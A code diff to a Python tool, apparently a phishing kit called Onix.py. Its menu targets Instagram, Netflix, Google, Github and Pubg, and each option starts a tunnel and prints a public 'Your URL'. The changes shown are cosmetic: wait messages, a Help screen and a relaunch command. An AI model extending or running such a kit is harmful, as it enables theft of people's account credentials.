@@ -101,7 +101,7 @@ print(f"""
 {Fore.RED}[{Fore.GREEN}04{Fore.RED}]{Fore.LIGHTWHITE_EX} Netflix      {Fore.RED}[{Fore.GREEN}05{Fore.RED}]{Fore.LIGHTWHITE_EX} Google      {Fore.RED}[{Fore.GREEN}06{Fore.RED}]{Fore.LIGHTWHITE_EX} Pubg
 
 
-{Fore.RED}[{Fore.GREEN}X{Fore.RED}]{Fore.LIGHTWHITE_EX} Port Scanner
+{Fore.RED}[{Fore.GREEN}X{Fore.RED}]{Fore.LIGHTWHITE_EX} Port Scanner   {Fore.RED}[{Fore.GREEN}XX{Fore.RED}]{Fore.LIGHTWHITE_EX} Help
 
 {Fore.RED}[{Fore.GREEN}0{Fore.RED}]{Fore.LIGHTWHITE_EX} Exit{Fore.RESET}
 """)
@@ -145,9 +145,9 @@ def instagram():
     sleep(1)
 
     loaclhost()
-
+    print(Fore.YELLOW + "please wait 10 second".title() ,end= "\r" + Fore.RESET)
     sleep(10)
-
+    print("                       " , end="\r")
 #====================================================================================================
 
     line = linecache.getline(r"localhost.txt" , 24)
@@ -378,8 +378,9 @@ def netflix():
     sleep(1)
 
     loaclhost()
-
-    sleep(8)
+    print(Fore.YELLOW + "please wait 10 second".title() ,end= "\r" + Fore.RESET)
+    sleep(10)
+    print("                       " , end="\r")
 #====================================================================================================
     line = linecache.getline(r"localhost.txt" , 24)
     print(f"\r\n{Fore.CYAN}Your URL :{Fore.LIGHTWHITE_EX}" , line.replace("tunneled with tls termination, " , " , "))
@@ -492,8 +493,9 @@ def Google():
     sleep(1)
 
     loaclhost()
-
-    sleep(8)
+    print(Fore.YELLOW + "please wait 10 second".title() ,end= "\r" + Fore.RESET)
+    sleep(10)
+    print("                       " , end="\r")
 #====================================================================================================
     line = linecache.getline(r"localhost.txt" , 24)
     print(f"\r\n{Fore.CYAN}Your URL :{Fore.LIGHTWHITE_EX}" , line.replace("tunneled with tls termination, " , " , "))
@@ -605,9 +607,9 @@ def Github():
     sleep(1)
 
     loaclhost()
-
-    sleep(8)
-
+    print(Fore.YELLOW + "please wait 10 second".title() ,end= "\r" + Fore.RESET)
+    sleep(10)
+    print("                       " , end="\r")
 #====================================================================================================
     line = linecache.getline(r"localhost.txt" , 24)
     print(f"\r\n{Fore.CYAN}Your URL :{Fore.LIGHTWHITE_EX}" , line.replace("tunneled with tls termination, " , " , "))
@@ -720,9 +722,9 @@ def Pubg():
     sleep(1)
 
     loaclhost()
-
-    sleep(8)
-
+    print(Fore.YELLOW + "please wait 10 second".title() ,end= "\r" + Fore.RESET)
+    sleep(10)
+    print("                       " , end="\r")
 #====================================================================================================
     line = linecache.getline(r"localhost.txt" , 24)
     print(f"\r\n{Fore.CYAN}Your URL :{Fore.LIGHTWHITE_EX}" , line.replace("tunneled with tls termination, " , " , "))
@@ -837,7 +839,15 @@ if ask == "5" or ask == "05":
 
 if ask == "6" or ask == "06":
     Pubg()
-
+    
+if ask == "xx" or ask == "XX":
+    clear()
+    with open("help.txt" , "r") as hint:
+        print(Fore.LIGHTWHITE_EX + hint.read() + Fore.RESET)
+        
+    go_back = input(Fore.GREEN + "want to go back to program (y/n) : " + Fore.RESET)
+    if go_back == "y" or go_back == "Y":
+        subprocess.call("python Onix.py" , shell=True)
 else:
     exit(f"""{Fore.YELLOW}│
 ╰┈➤{Fore.BLUE}[-]{Fore.RED} No Such Option !""")
